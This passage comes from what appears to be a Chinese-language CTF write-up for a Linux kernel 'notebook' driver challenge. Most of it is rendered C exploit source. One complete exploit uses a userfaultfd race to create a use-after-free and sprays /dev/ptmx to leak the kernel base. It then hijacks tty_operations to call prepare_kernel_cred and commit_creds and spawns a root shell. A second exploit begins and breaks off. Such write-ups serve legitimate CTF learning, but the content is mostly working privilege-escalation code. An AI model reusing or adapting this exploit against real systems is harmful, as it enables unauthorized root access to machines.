class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> g_fd = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span>* addr;</span><br><span class="line"><span class="keyword">uint64_t</span> temp_buf[<span class="number">0x20</span>];</span><br><span class="line"><span class="keyword">int</span> temp_fd;</span><br><span class="line"><span class="keyword">uint64_t</span> heap_addr;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE sysconf(_SC_PAGE_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> bzImage_base = <span class="number">0xFFFFFFFF81000000</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> kernel_base;</span><br><span class="line"><span class="keyword">uint64_t</span> work_for_cpu_fn = <span class="number">0xFFFFFFFF8109EB90</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> ptm_ops = <span class="number">0xFFFFFFFF81E8E440</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> cc_addr = <span class="number">0xFFFFFFFF810A9B40</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> pkc_addr = <span class="number">0xFFFFFFFF810A9EF0</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">note</span>&#123;</span></span><br><span class="line">	<span class="keyword">uint64_t</span> note;</span><br><span class="line">	<span class="keyword">uint64_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">userarg</span>&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> idx;</span><br><span class="line">    <span class="keyword">uint64_t</span> size;</span><br><span class="line">    <span class="keyword">char</span>* buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ErrExit</span><span class="params">(<span class="keyword">char</span>* err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">userfaultfd_leak_handler</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) arg;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    </span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    sleep(<span class="number">30</span>);</span><br><span class="line">    <span class="comment">// pause();</span></span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>) ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>) ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* page = (<span class="keyword">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED) ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] leak handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RegisterUserfault</span><span class="params">(<span class="keyword">void</span> *fault_page,<span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page;     <span class="comment">//我们要监视的区域</span></span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)    <span class="comment">//注册缺页错误处理</span></span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>,handler, (<span class="keyword">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">noteadd</span><span class="params">(<span class="keyword">uint64_t</span> idx, <span class="keyword">uint64_t</span> size, <span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ioctl(g_fd, <span class="number">0x100</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">notedel</span><span class="params">(<span class="keyword">uint64_t</span> idx)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = <span class="number">0</span>,</span><br><span class="line">        .buf = <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    ioctl(g_fd, <span class="number">0x200</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">noteedit</span><span class="params">(<span class="keyword">uint64_t</span> idx, <span class="keyword">uint64_t</span> size, <span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ioctl(g_fd, <span class="number">0x300</span>, &amp;arg);    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">notegift</span><span class="params">(<span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = <span class="number">0</span>,</span><br><span class="line">        .size = <span class="number">0</span>,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;   </span><br><span class="line"></span><br><span class="line">    ioctl(g_fd, <span class="number">0x64</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_note</span><span class="params">(<span class="keyword">char</span>* con_buf, <span class="keyword">uint64_t</span> idx)</span></span>&#123;</span><br><span class="line">    write(g_fd,con_buf,idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_note</span><span class="params">(<span class="keyword">char</span>* con_buf, <span class="keyword">uint64_t</span> idx)</span></span>&#123;</span><br><span class="line">    read(g_fd,con_buf,idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">edit_thread</span><span class="params">()</span></span>&#123;</span><br><span class="line">    noteedit(<span class="number">0</span>, <span class="number">0x500</span>, addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">add_thread</span><span class="params">()</span></span>&#123;</span><br><span class="line">    noteadd(<span class="number">0</span>,<span class="number">0x60</span>,addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ret_buf = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> fd[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">uint64_t</span> leak_addr;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    g_fd = open(<span class="string">&quot;/dev/notebook&quot;</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. notebook[0].note = heap1 / notebook[0].size = 0x3a8</span></span><br><span class="line">    <span class="keyword">char</span>* name = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(name, <span class="string">&#x27;a&#x27;</span>, <span class="number">18</span>);</span><br><span class="line">    noteadd(<span class="number">0</span>,<span class="number">0x60</span>,name);</span><br><span class="line">    noteedit(<span class="number">0</span>,<span class="number">0x3a8</span>,name);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. using userfaultfd to produce UAF: notebook[0].note = heap1 / notebook[0].size = 0x500</span></span><br><span class="line">    addr = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(addr, userfaultfd_leak_handler);</span><br><span class="line">    <span class="keyword">pthread_t</span> thr_edit,thr_add;</span><br><span class="line">    pthread_create(&amp;thr_edit, <span class="literal">NULL</span>, edit_thread, <span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. set notebook size to enable read/write : notebook[0].note = heap1 / notebook[0].size = 0x60</span></span><br><span class="line">    pthread_create(&amp;thr_add, <span class="literal">NULL</span>, add_thread, <span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);   <span class="comment">//给1s缓冲时间，让size值写上</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 4. get heap1 back, then we can use the UAF</span></span><br><span class="line">    <span class="keyword">for</span>(i =<span class="number">0</span> ;i&lt;<span class="number">100</span>; i++)&#123;</span><br><span class="line">        fd[i] = open(<span class="string">&quot;dev/ptmx&quot;</span>,<span class="number">2</span>);              <span class="comment">// in kernel it will kmalloc(0x3a8)</span></span><br><span class="line">        read_note(ret_buf, <span class="number">0</span>);                          </span><br><span class="line">        leak_addr = *(<span class="keyword">int64_t</span> *)(ret_buf+<span class="number">0x18</span>);</span><br><span class="line">        <span class="keyword">if</span>(((leak_addr&amp;<span class="number">0xffffffff00000000</span>) &gt;&gt; <span class="number">32</span>) == <span class="number">0xFFFFFFFF</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>((leak_addr&amp;<span class="number">0xfff</span>) == <span class="number">0x440</span>)              <span class="comment">// check whether we hit heap1 or not</span></span><br><span class="line">            &#123;</span><br><span class="line">                index = i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;found it! the index is %d\n&quot;</span>,index);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">100</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;failed to get heap1 back, let&#x27;s reboot and try again!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. calc kernel base</span></span><br><span class="line">    kernel_base = leak_addr - (ptm_ops - bzImage_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_base : 0x%lx\n&quot;</span>,kernel_base);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6. notebook[0].note = heap2 / notebook[0].size = 0x100</span></span><br><span class="line">    noteadd(<span class="number">1</span>,<span class="number">0x60</span>,name);</span><br><span class="line">    noteedit(<span class="number">1</span>,<span class="number">0x100</span>,name);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 7. change tty_operations-&gt;ioctl to work_for_cpu_fn</span></span><br><span class="line">    notegift(ret_buf);</span><br><span class="line">    <span class="keyword">uint64_t</span> heap_addr_fn = *(<span class="keyword">int64_t</span> *)(ret_buf+<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">char</span>* fop_buf = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">// 先读后写</span></span><br><span class="line">    read_note(fop_buf,<span class="number">1</span>);</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(fop_buf+<span class="number">0x60</span>) = work_for_cpu_fn - bzImage_base + kernel_base; </span><br><span class="line">    write_note(fop_buf,<span class="number">1</span>);   </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;tty_struct heap1 addr: 0x%lx\n&quot;</span>,*(<span class="keyword">int64_t</span> *)(ret_buf));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;tty_operations heap2 addr: 0x%lx\n&quot;</span>,heap_addr_fn);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 8. prepare_kernel_creds(0)    </span></span><br><span class="line">    <span class="comment">// 先读后写，不然可能覆盖掉重要数据</span></span><br><span class="line">    <span class="keyword">char</span>* tty_buf = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">    read_note(tty_buf,<span class="number">0</span>);</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(tty_buf+<span class="number">0x18</span>) = heap_addr_fn;         <span class="comment">// change tty_struct-&gt;ops, make it points to heap2</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(tty_buf+<span class="number">0x20</span>) = pkc_addr - bzImage_base + kernel_base;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(tty_buf+<span class="number">0x28</span>) = <span class="number">0x0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> old_value_0x30 = *(<span class="keyword">uint64_t</span> *)(tty_buf+<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;old value : 0x%lx\n&quot;</span>,old_value_0x30);</span><br><span class="line">    write_note(tty_buf,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd[index],<span class="number">0x100</span>,<span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 9. commit_cred(prepare_kernel_creds(0))    </span></span><br><span class="line">    <span class="comment">// 先读后写，不然可能覆盖掉重要数据</span></span><br><span class="line">    read_note(tty_buf,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> pkc_ret = *(<span class="keyword">uint64_t</span> *)(tty_buf+<span class="number">0x30</span>);</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(tty_buf+<span class="number">0x18</span>) = heap_addr_fn;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(tty_buf+<span class="number">0x20</span>) = cc_addr - bzImage_base + kernel_base;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(tty_buf+<span class="number">0x28</span>) = pkc_ret;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(tty_buf+<span class="number">0x30</span>) = old_value_0x30;</span><br><span class="line">    write_note(tty_buf,<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    ioctl(fd[index],<span class="number">0x100</span>,<span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 10. get root shell</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] getuid() = %d\n&quot;</span>,getuid());</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Pwned!\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>



        <h3 id="exp5"   >
          <a href="#exp5" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp5" class="headerlink" title="exp5"></a>exp5</h3>
      <p>内核地址泄露：利用ko泄露（程序运行过程中，e8指令后四个字节是相对偏移量，被调用函数实际段偏移量 = 下一条指令地址 + 相对偏移量）<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.jianshu.com/p/55726f7e355a" >带你弄懂 call 指令调用方式</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>任意地址读写：泄露堆地cookie，构造heap链：<code>freelist -&gt; chunk1 -&gt; notebook_addr - 0x10</code>。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> g_fd = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span>* addr;</span><br><span class="line"><span class="keyword">uint64_t</span> temp_buf[<span class="number">0x20</span>];</span><br><span class="line"><span class="keyword">int</span> temp_fd;</span><br><span class="line"><span class="keyword">uint64_t</span> heap_addr;</span><br><span class="line"><span class="keyword">int</span> uaf_index;</span><br><span class="line"><span class="keyword">uint64_t</span> module_base = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE sysconf(_SC_PAGE_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> bzImage_base = <span 